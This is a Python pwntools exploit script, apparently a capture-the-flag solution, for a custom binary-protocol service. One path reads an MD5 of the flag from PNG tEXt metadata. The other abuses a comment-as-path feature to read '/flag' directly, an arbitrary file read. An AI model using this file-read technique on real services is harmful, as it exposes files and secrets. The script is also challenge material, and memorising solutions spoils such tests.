from __future__ import annotations

from pwn import remote  # type: ignore
from pwn import p16     # type: ignore
import os
import re
from typing import Dict, Tuple, Optional, List


# Protocol helpers -----------------------------------------------------------

def send_cmd(io, data: bytes) -> None:
    io.send(data)


def read_exact(io, n: int, timeout: float = 2.0) -> bytes:
    data = b""
    while len(data) < n:
        chunk = io.recv(n - len(data), timeout=timeout)
        if not chunk:
            break
        data += chunk
    return data


def read_chunk(io, timeout: float = 2.0) -> Optional[Tuple[int, bytes]]:
    """Read one server chunk: 1-byte tag + 2-byte little-endian length + payload."""
    hdr = read_exact(io, 3, timeout=timeout)
    if len(hdr) < 3:
        return None
    tag = hdr[0]
    length = hdr[1] | (hdr[2] << 8)
    payload = read_exact(io, length, timeout=timeout)
    if len(payload) < length:
        return None
    return tag, payload


def send_length_prefixed_blob(io, data: bytes) -> None:
    io.send(p16(len(data), endian="little") + data)


# Response parsing -----------------------------------------------------------

PRINTABLE_RE = re.compile(rb"[ -~]{1,256}")


def tokenize_printables(data: bytes) -> List[bytes]:
    return [m.group(0) for m in PRINTABLE_RE.finditer(data)]


def parse_png_text_chunks(payload: bytes) -> Dict[str, str]:
    """Parse PNG tEXt chunks into a dict of key->value.

    PNG layout: 8-byte signature, then repeated [length(4 BE), type(4), data, crc(4)].
    For type 'tEXt', data is keyword(ASCII) + 0x00 + text(ISO-8859-1/ASCII).
    """
    out: Dict[str, str] = {}
    # PNG signature
    if not (len(payload) >= 8 and payload[:8] == b"\x89PNG\r\n\x1a\n"):
        return out
    off = 8
    while off + 12 <= len(payload):
        length = int.from_bytes(payload[off : off + 4], "big")
        ctype = payload[off + 4 : off + 8]
        off += 8
        if off + length + 4 > len(payload):
            break
        data = payload[off : off + length]
        off += length
        crc = payload[off : off + 4]
        off += 4
        if ctype == b"tEXt":
            try:
                if b"\x00" in data:
                    key, value = data.split(b"\x00", 1)
                    k = key.decode("latin-1", errors="ignore")
                    v = value.decode("latin-1", errors="ignore")
                    if k:
                        out[k] = v
            except Exception:
                pass
        if ctype == b"IEND":
            break
    return out


def parse_kv_payload(payload: bytes) -> Dict[str, str]:
    """Best-effort parse of a key/value bundle produced by opcode 0x32.

    The server serializes a small structure with fields like "Author", "Comment",
    and "Software" using an internal container format. We conservatively scan the
    payload for printable tokens and map well-known keys to the token that follows.
    """
    # First, handle PNG tEXt-encoded bundles, which the server commonly emits
    # (Author/Software are stored as PNG text chunks).
    png = parse_png_text_chunks(payload)
    if png:
        return png

    tokens = tokenize_printables(payload)
    keys = {b"Author", b"Comment", b"Software"}
    out: Dict[str, str] = {}
    for i, tok in enumerate(tokens):
        # Allow cases like 'tEXtAuthor' by checking substring containment
        matched_key: Optional[bytes] = None
        for k in keys:
            if tok == k or (k in tok):
                matched_key = k
                break
        if matched_key and i + 1 < len(tokens):
            # Prefer the very next printable token as the value
            key = matched_key.decode("ascii", errors="ignore")
            val = tokens[i + 1].decode("utf-8", errors="ignore")
            # Guard against obviously invalid huge values
            if len(val) > 0:
                out[key] = val
    return out


# Exploit flow ---------------------------------------------------------------

def exploit_fetch_metadata(io) -> Tuple[Optional[Dict[str, str]], bytes]:
    # 0x10: enable session; 0x22: build default entry with flag in Author; 0x32 x01: request bundle
    send_cmd(io, b"\x10")
    io.recv(timeout=1.1)  # ignore 1-byte ack if present
    send_cmd(io, b"\x22")
    io.recv(timeout=1.1)
    send_cmd(io, b"\x32\x01")

    chunk = read_chunk(io, timeout=2.0)
    if not chunk:
        return None, b""
    tag, payload = chunk
    parsed = parse_kv_payload(payload)
    return parsed, payload


def exploit_fetch_flag_via_comment(io) -> bytes:
    """Abuse comment type=2 (path) to read /flag plaintext and return it."""
    # 0x10: enable
    send_cmd(io, b"\x10")
    io.recv(timeout=0.5)
    # 0x22: create default entry (comment type preset to 2)
    send_cmd(io, b"\x22")
    io.recv(timeout=0.5)
    # 0x31: set comment to path "/flag" (length-prefixed blob)
    send_cmd(io, b"\x31")
    send_length_prefixed_blob(io, b"/flag")
    io.recv(timeout=0.5)
    # 0x30: get comment value; server returns a tagged blob containing file contents
    send_cmd(io, b"\x30")
    chunk = read_chunk(io, timeout=2.0)
    if not chunk:
        return b""
    _tag, payload = chunk
    return payload


def main():
    host = os.environ.get("HOST", "127.0.0.1")
    port = int(os.environ.get("PORT", "4265"))
    io = remote(host, port)
    try:
        # First path: MD5-hex via PNG metadata bundle
        kv, raw = exploit_fetch_metadata(io)
        if kv:
            print("Parsed fields:")
            for k in ("Author", "Comment", "Software"):
                if k in kv:
                    print(f"- {k}: {kv[k]}")
            if "Author" in kv:
                print(f"\nAuthor (MD5 of flag): {kv['Author']}")
        else:
            print(f"No parsable KV bundle. Raw chunk ({len(raw)} bytes)")

        # Second path: plaintext flag via comment-as-path trick
        try:
            plain = exploit_fetch_flag_via_comment(io)
            if plain:
                print(f"\nPlaintext flag via comment: {plain.decode('utf-8', errors='ignore')}")
            else:
                print("\nFailed to fetch plaintext flag via comment.")
        except Exception as e:
            print(f"\nError fetching plaintext flag via comment: {e}")
    finally:
        try:
            send_cmd(io, b"\x11")  # close session politely
        except Exception:
            pass
        io.close()


if __name__ == "__main__":
    main()


